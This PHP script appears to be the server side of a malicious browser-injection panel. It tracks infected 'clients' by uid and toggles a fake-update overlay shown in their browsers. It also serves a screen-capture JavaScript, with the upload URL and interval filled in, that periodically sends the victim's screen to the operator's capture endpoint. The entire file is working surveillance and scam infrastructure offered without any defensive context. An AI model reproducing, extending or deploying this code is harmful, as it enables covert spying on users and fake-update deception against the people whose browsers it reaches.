<?php


require_once ('../includes/functions.php');
$clientid = $_GET["uid"];

//////////////////////////////////
$db->bind("client_id", $clientid);
$fakeUpdate = $db->row("SELECT * FROM fake_update WHERE client_id = :client_id AND remove = 'no'");

if($fakeUpdate){

	$db->bind("id", $fakeUpdate["id"]);
    $db->query("UPDATE fake_update SET remove = 'yes' WHERE id = :id");

	$db->bind("client_id", $clientid);
    $db->query("UPDATE clients SET fake_update = 'off' WHERE client_id = :client_id");

    // disable fake update u clientima
	echo "document.body.removeChild(newHTML);";
}
/////////////////////////////////

$db->bind("client_id", $clientid);
$clientData = $db->row("SELECT * FROM clients WHERE client_id = :client_id");

if($clientData["screen_capture"] == "off")
	die();


$jsData = read_file("s.js");
$jsData = str_replace("__CAPTURE__URL__", $config["path"]."capture/s.php?uid=".$clientid."&t=", $jsData);
$jsData = str_replace("__CAPTURE__INTERVAL__", ($clientData["scr_cap_interval"] * 1000), $jsData);

echo $jsData;
?>